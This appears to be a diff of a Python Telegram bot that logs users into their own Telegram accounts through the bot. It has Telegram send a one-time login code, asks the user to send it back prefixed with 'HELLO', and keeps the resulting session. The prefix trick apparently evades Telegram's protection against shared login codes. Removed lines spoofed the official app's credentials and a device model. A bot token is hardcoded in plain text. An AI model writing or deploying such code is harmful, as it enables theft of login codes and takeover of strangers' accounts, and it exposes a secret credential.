@@ -5,7 +5,7 @@ import threading
 from flask import Flask
 
 # ==========================================
-# 1. DUMMY WEB SERVER (RENDER KO BYPASS KARNE KE LIYE)
+# 1. DUMMY WEB SERVER (Render Deploy Bypass)
 # ==========================================
 web_app = Flask(__name__)
 
@@ -14,17 +14,14 @@ def home():
     return "Telegram Bot is Running Successfully! 🚀"
 
 def run_web_server():
-    # Render khud PORT environment variable set karta hai
     port = int(os.environ.get("PORT", 8080))
     web_app.run(host="0.0.0.0", port=port)
 
-# Web server ko ek alag thread me start karna taaki bot block na ho
 threading.Thread(target=run_web_server, daemon=True).start()
-# ==========================================
 
 
 # ==========================================
-# 2. BUG FIX FOR RENDER (Python 3.12+ async issue)
+# 2. BUG FIX FOR RENDER (Python 3.12+)
 # ==========================================
 try:
     asyncio.get_event_loop()
@@ -32,14 +29,17 @@ except RuntimeError:
     asyncio.set_event_loop(asyncio.new_event_loop())
 
 from pyrogram import Client, filters
-from pyrogram.errors import SessionPasswordNeeded
+from pyrogram.errors import SessionPasswordNeeded, FloodWait
 
 
 # ==========================================
 # 3. TELEGRAM BOT MAIN LOGIC
 # ==========================================
-API_ID = 6
-API_HASH = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
+
+# ⚠️ YAHAN APNA API ID AUR HASH DALEIN (my.telegram.org se)
+API_ID = 12345678  # Ise Integer me likhein (Quotes me nahi)
+API_HASH = "your_actual_api_hash_here"
+
 BOT_TOKEN = "8328669216:AAHPMCAVNRQQj95kIF0WSWmE7rmncuz8QvA"
 
 app = Client("my_auto_login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
@@ -64,20 +64,20 @@ async def process_login(client, message):
     if step == "phone":
         phone = message.text
         
+        # Ab hum normal Custom API login use kar rahe hain (Device model hata diya)
         user_client = Client(
             f"session_{user_id}", 
             api_id=API_ID, 
             api_hash=API_HASH, 
-            in_memory=True,
-            device_model="Samsung Galaxy S23",
-            system_version="Android 14",
-            app_version="Telegram 10.6.1",
-            lang_code="en"
+            in_memory=True
         )
         await user_client.connect()
         
         try:
+            # OTP bhejne ki koshish
+            await message.reply("OTP bhej raha hu, kripya wait karein... ⏳")
             sent_code = await user_client.send_code(phone)
+            
             login_data[user_id] = {
                 "step": "otp",
                 "phone": phone,
@@ -85,12 +85,17 @@ async def process_login(client, message):
                 "user_client": user_client
             }
             await message.reply(
-                "OTP bhej diya gaya hai! 📩\n\n"
+                "✅ OTP aapke Telegram App par bhej diya gaya hai!\n\n"
                 "Kripya OTP ko **HELLO** ke sath bhejen.\n"
                 "Example: Agar OTP 12345 hai, toh **HELLO12345** likh kar bhejen."
             )
+            
+        except FloodWait as e:
+            await message.reply(f"❌ Telegram ne is number par limit laga di hai. {e.value} seconds baad try karein.")
+            login_data.pop(user_id, None)
+            
         except Exception as e:
-            await message.reply(f"❌ Error aaya: {e}")
+            await message.reply(f"❌ OTP bhejne me error aaya: {e}\n(Yeh error Telegram ki taraf se hai)")
             login_data.pop(user_id, None)
             
     elif step == "otp":
@@ -140,5 +145,5 @@ async def process_login(client, message):
             login_data.pop(user_id, None)
 
 if __name__ == "__main__":
-    print("Bot is starting...")
+    print("Bot is ready!")
     app.run()
